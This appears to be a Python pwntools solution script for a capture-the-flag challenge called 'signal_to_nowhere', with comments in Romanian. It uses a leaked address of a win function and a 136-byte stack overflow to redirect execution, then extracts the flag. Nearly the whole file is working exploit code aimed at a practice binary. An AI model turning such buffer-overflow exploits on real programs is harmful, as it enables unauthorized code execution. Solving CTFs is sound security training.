#!/usr/bin/env python3
# ============================================================================
# CTF: signal_to_nowhere — ret2win peste PIE (adresa data de program)
# Vulnerabilitate: programul iti ofera ("gift") chiar adresa runtime a functiei win,
#   anuland ASLR/PIE. Apoi overflow (128+8) => ret in win_addr leak-uit.
# Binar: ELF 64-bit (amd64), not stripped | NX OFF · fara canary · PIE ON · Full RELRO
#   - PIE ON => adrese randomizate, DAR leak-ul de win_addr il ocoleste complet.
#     Fara canary => overflow direct la ret. Full RELRO irelevant (nu atingem GOT).
# ============================================================================
import sys
import re
from pwn import *

context.binary = elf = ELF('./signal_to_nowhere')
context.log_level = 'error'          # scoate zgomotul pwntools

def connect():
    # remote doar daca ai dat HOST + PORT numeric; altfel proces local
    if len(sys.argv) >= 3 and sys.argv[2].isdigit():
        return remote(sys.argv[1], sys.argv[2])
    return process('./signal_to_nowhere')

p = connect()

p.recvuntil(b"Say magic words: ")
payload = b'A' * 100
p.sendline(payload)

p.recvuntil(b"This is your gift: ")
leak = p.recvline().strip()
win_addr = int(leak, 16)

p.recvuntil(b"[+] Now make a wish: ")
payload = b'A' * (128 + 8)
payload += p64(win_addr)
p.sendline(payload)

out = p.recvall(timeout=2)
# cauta un flag care incepe cu CTF, SI sau FLAG; daca nu-l gaseste, arata output-ul brut
flag = re.search(rb"(CTF|SI|FLAG)\{[^}]*\}", out)
print(flag.group().decode() if flag else out)
